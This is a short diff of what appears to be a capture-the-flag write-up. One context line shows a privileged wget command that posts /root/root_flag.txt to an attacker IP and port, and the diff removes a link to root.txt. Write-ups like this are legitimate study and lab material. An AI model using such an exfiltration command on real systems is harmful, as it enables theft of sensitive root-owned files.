@@ -46,7 +46,6 @@ Victim:
 sudo wget --post-file=/root/root_flag.txt 10.8.22.204:1337
 ```
 
-[root.txt](files/root.txt)  
 And just hold enter some time then just crtl+c and `cat root.txt`
 - We got it  
 ![rootflag](rootflag.png)
